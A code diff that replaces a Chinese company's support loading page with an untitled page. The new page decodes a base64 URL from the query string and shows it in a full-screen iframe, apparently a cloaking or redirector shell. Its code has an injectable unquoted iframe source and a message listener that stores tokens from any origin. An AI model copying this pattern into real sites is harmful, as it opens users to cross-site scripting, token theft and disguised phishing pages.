@@ -1,26 +1,371 @@
-<!DOCTYPE html>
 <html lang="zh-CN">
     <head>
+      
         <meta charset="UTF-8">
-        <title>乘风破浪会有时-直挂云帆济沧海</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-        <meta name="description" content="众耀科技客户支持页面，提供常见问题与联系方式，帮助客户获取产品文档与技术支持。">
-        <link rel="preconnect" href="https://res.wx.qq.com">
-        <link rel="dns-prefetch" href="https://res.wx.qq.com">
-        <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js" crossorigin="anonymous"></script>
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-touch-fullscreen" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <meta name="MobileOptimized" content="320">
+        <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport"/>
+        <meta content="yes" name="apple-mobile-web-app-capable"/>
+        <meta content="yes" name="apple-touch-fullscreen"/>
+        <meta content="black" name="apple-mobile-web-app-status-bar-style"/>
+        <meta content="320" name="MobileOptimized"/>
+        <title></title>
         <style>
-            html,body{margin:0;padding:0;width:100%;height:100%;display:flex;justify-content:center;align-items:center;background:#fff;font-family:"Microsoft YaHei"}#ldB{display:flex;flex-direction:column;align-items:center}.circle{width:30px;height:30px;border:10px solid #f0f2f5;border-top-color:#0052D9;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}p{margin-top:12px;font-size:14px;color:#666}
+            .container {
+                width: 100px;
+                height: 100px;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            }
+    
+            .dot {
+                width: 15px;
+                height: 15px;
+                border-radius: 50%;
+                background-color: #000;
+                position: absolute;
+                top: 0;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                margin: auto;
+            }
+    
+            .dot-3 {
+                background-color: #f74d75;
+            }
+    
+            .dot-2 {
+                background-color: #10beae;
+            }
+    
+            .dot-1 {
+                background-color: #ffe386;
+            }
+    
+            .dot-3 {
+                background-color: #f74d75;
+                animation: dot-3-move 2s ease infinite;
+            }
+    
+          @keyframes dot-3-move {
+            20% {
+              transform: scale(1);
+            }
+    
+            45% {
+              transform: translateY(-18px) scale(0.45);
+            }
+    
+            60% {
+              transform: translateY(-25px) scale(0.45);
+            }
+    
+            80% {
+              transform: translateY(-25px) scale(0.45);
+            }
+    
+            100% {
+              transform: translateY(0px) scale(1);
+            }
+          }
+    
+          .dot-2 {
+            background-color: #10beae;
+            animation: dot-2-move 2s ease infinite;
+          }
+    
+          .dot-1 {
+            background-color: #ffe386;
+            animation: dot-1-move 2s ease infinite;
+          }
+    
+          @keyframes dot-2-move {
+            20% {
+              transform: scale(1);
+            }
+    
+            45% {
+              transform: translate(-16px, 12px) scale(0.45);
+            }
+    
+            60% {
+              transform: translate(-20px, 15px) scale(0.45);
+            }
+    
+            80% {
+              transform: translate(-20px, 15px) scale(0.45);
+            }
+    
+            100% {
+              transform: translateY(0px) scale(1);
+            }
+          }
+    
+          @keyframes dot-1-move {
+            20% {
+              transform: scale(1);
+            }
+    
+            45% {
+              transform: translate(16px, 12px) scale(0.45);
+            }
+    
+            60% {
+              transform: translate(20px, 15px) scale(0.45);
+            }
+    
+            80% {
+              transform: translate(20px, 15px) scale(0.45);
+            }
+    
+            100% {
+              transform: translateY(0px) scale(1);
+            }
+          }
+    
+          .container {
+            width: 100px;
+            height: 100px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: rotate-move 2s ease-in-out infinite;
+          }
+    
+          @keyframes rotate-move {
+            55% {
+              transform: translate(-50%, -50%) rotate(0deg);
+            }
+    
+            80% {
+              transform: translate(-50%, -50%) rotate(360deg);
+            }
+    
+            100% {
+              transform: translate(-50%, -50%) rotate(360deg);
+            }
+          }
+          .container {
+            width: 100px;
+            height: 100px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+          }
+    
+          .dot {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background-color: #000;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+          }
+    
+          .dot-3 {
+            background-color: #f74d75;
+          }
+    
+          .dot-2 {
+            background-color: #10beae;
+          }
+    
+          .dot-1 {
+            background-color: #ffe386;
+          }
+    
+          .dot-3 {
+            background-color: #f74d75;
+            animation: dot-3-move 2s ease infinite;
+          }
+    
+          @keyframes dot-3-move {
+            20% {
+              transform: scale(1);
+            }
+    
+            45% {
+              transform: translateY(-18px) scale(0.45);
+            }
+    
+            60% {
+              transform: translateY(-25px) scale(0.45);
+            }
+    
+            80% {
+              transform: translateY(-25px) scale(0.45);
+            }
+    
+            100% {
+              transform: translateY(0px) scale(1);
+            }
+          }
+    
+          .dot-2 {
+            background-color: #10beae;
+            animation: dot-2-move 2s ease infinite;
+          }
+    
+          .dot-1 {
+            background-color: #ffe386;
+            animation: dot-1-move 2s ease infinite;
+          }
+    
+          @keyframes dot-2-move {
+            20% {
+              transform: scale(1);
+            }
+    
+            45% {
+              transform: translate(-16px, 12px) scale(0.45);
+            }
+    
+            60% {
+              transform: translate(-20px, 15px) scale(0.45);
+            }
+    
+            80% {
+              transform: translate(-20px, 15px) scale(0.45);
+            }
+    
+            100% {
+              transform: translateY(0px) scale(1);
+            }
+          }
+    
+          @keyframes dot-1-move {
+            20% {
+              transform: scale(1);
+            }
+    
+            45% {
+              transform: translate(16px, 12px) scale(0.45);
+            }
+    
+            60% {
+              transform: translate(20px, 15px) scale(0.45);
+            }
+    
+            80% {
+              transform: translate(20px, 15px) scale(0.45);
+            }
+    
+            100% {
+              transform: translateY(0px) scale(1);
+            }
+          }
+    
+          .container {
+            width: 100px;
+            height: 100px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: rotate-move 2s ease-in-out infinite;
+          }
+    
+          @keyframes rotate-move {
+            55% {
+              transform: translate(-50%, -50%) rotate(0deg);
+            }
+    
+            80% {
+              transform: translate(-50%, -50%) rotate(360deg);
+            }
+    
+            100% {
+              transform: translate(-50%, -50%) rotate(360deg);
+            }
+          }
+          .content {
+            height: 100%;
+            width: 100%;
+            position: fixed;
+            left: -2px;
+            top: -2px;
+          }
         </style>
+        <body>
+          <div
+            id="container"
+            class="container"
+          >
+            <div class="dot dot-1"></div>
+            <div class="dot dot-2"></div>
+            <div class="dot dot-3"></div>
+          </div>
+          <script>
+            var urlParams = new URLSearchParams(window.location.search);
+            var encodedParam = urlParams.get('c');
+            var tureurl = atob(encodedParam);
+            if (tureurl.includes('http')) {
+              var square = document.getElementById('container');
+              setTimeout(function () {
+                square.style.display = 'none';
+                // document.title = '';
+              }, 1500);
+              var html = '<iframe id="iframeB" class="content" οnlοad="bindMouseWhee(this)" src=' + tureurl + '></iframe>';
+              document.writeln(html);
+              console.log(tureurl);
+            } else {
+              console.log('nourls');
+            }
+    
+           window.addEventListener('message', (event) => { 
+                // 存储从iframe收到的token 
+                if (event.data.type === 'SET_TOKEN') { 
+                localStorage.setItem('B_token', event.data.token); 
+                } 
+                }); 
+                
+                 // iframe加载后发送token 
+                document.getElementById('iframeB').onload = () => { 
+                const token = localStorage.getItem('B_token'); 
+                if (token) { 
+                const iframe = document.getElementById('iframeB'); 
+                iframe.contentWindow.postMessage({ type: 'INIT_TOKEN', token }, new URL(tureurl).origin); 
+                } 
+                }; 
+          </script>
+          <script>
+            var firefox = navigator.userAgent.indexOf('Firefox') != -1;
+            function MouseWheel(e, doc) {
+              e.preventDefault && e.preventDefault(), (e.returnValue = false);
+              var up = (firefox && e.detail < 0) || e.wheelDelta > 0;
+              doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50;
+            }
+            function bindMouseWhee(ifr) {
+              try {
+                var doc = ifr.contentWindow.document;
+                firefox
+                  ? doc.addEventListener(
+                      'DOMMouseScroll',
+                      function (e) {
+                        MouseWheel(e, doc);
+                      },
+                      false
+                    )
+                  : (doc.onmousewheel = function (e) {
+                      MouseWheel(e || ifr.contentWindow.event, doc);
+                    });
+              } catch (e) {
+                alert('跨域无法获取iframe加载document' + e);
+              }
+            }
+          </script>
+        </body>
     </head>
-    <body>
-        <div id="ldB">
-            <div class="circle"></div>
-        </div>
-        <footer style="position:fixed;bottom:10px;width:100%;text-align:center;font-size:12px;color:#999;">
-            © 2025 众耀科技 版权所有
-            <br>
-            联系方式：eastverse@163.com
-        </footer>
-        <script src="https://eastverse.obs.cn-south-1.myhuaweicloud.com/xcx/main.js"></script>
-    </body>
 </html>
